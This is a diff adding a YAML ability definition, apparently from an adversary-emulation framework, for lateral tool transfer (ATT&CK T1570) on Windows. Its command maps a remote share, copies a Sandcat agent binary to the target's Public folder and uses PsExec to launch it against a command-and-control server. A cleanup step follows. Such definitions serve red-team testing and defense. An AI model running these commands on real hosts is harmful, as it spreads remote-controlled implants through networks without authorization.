@@ -1,0 +1,18 @@
+- id: 620b674a-7655-436c-b645-bc3e8ea51abd
+  description: Copy Sandcat file using PsExec on CMD
+  name: Copy Sandcat File using PsExec on CMD
+  tactic: lateral-movement
+  technique:
+    attack_id: T1570
+    name: Lateral Tool Transfer
+  platforms:
+    windows:
+      cmd:
+        cleanup: del /f sandcat.go-windows && del /f \\#{remote.host.name}\Users\Public\sandcat.go-windows.exe
+        command: |
+          net /y use \\#{remote.host.name} & copy /y sandcat.go-windows
+          \\#{remote.host.name}\Users\Public & #{psexec.path} -accepteula \\#{remote.host.name}
+          cmd /c start C:\Users\Public\sandcat.go-windows -server #{server} -v
+        payloads:
+        - sandcat.go-windows
+  singleton: True
